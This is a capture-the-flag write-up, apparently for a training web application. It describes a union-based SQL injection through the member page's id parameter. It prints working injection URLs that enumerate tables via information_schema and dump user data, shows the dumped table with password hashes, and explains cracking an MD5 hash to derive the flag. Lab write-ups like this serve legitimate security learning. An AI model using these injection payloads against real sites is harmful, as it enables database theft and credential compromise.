For this flag, i used an sql injection from the member get by id route.

Here is the route, normaly used :/index.php?page=member&id=2Submit=Submit

With a union sql injection attack I was able to export 5 tables content.

I was able to extract the table names with this request :
http://{{host}}/index.php?page=member&id=2 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables&Submit=Submit

Here is a sample of the union attack, for the db vote_dbs :
http://{{host}}/index.php?page=member&id=2 UNION SELECT nb_vote, subject FROM Member_survey.vote_dbs&Submit=Submit


For this flag, this is the users table that will contain the flag. Here is the exported table :

| user_id | first_name | last_name | town | country | planet | commentaire | countersign |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | one | me | Paris | France | Earth | Je pense, donc je suis | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2 | two | me | Helsinki | Finland | Earth | Aamu on iltaa viisaampi. | 60e9032c586fb422e2c16dee6286cf10 |
| 3 | three | me | Dublin | Irlande | Earth | Dublin is a city of stories and secrets. | e083b24a01c483437bcf4a9eea7c1b4d |
| 5 | Flag | GetThe | 42 | 42 | 42 | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

As you can see in the countrysign of the user 5, there is some instruction to get the flag.

`5ff9d0165b4f92b14994e5c685cdce28` is a md5 encryption.
Decrypted version is : `FortyTwo` .
Char lowered is `fortytwo` .
And then the sha256 version is : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

So we got the flag !
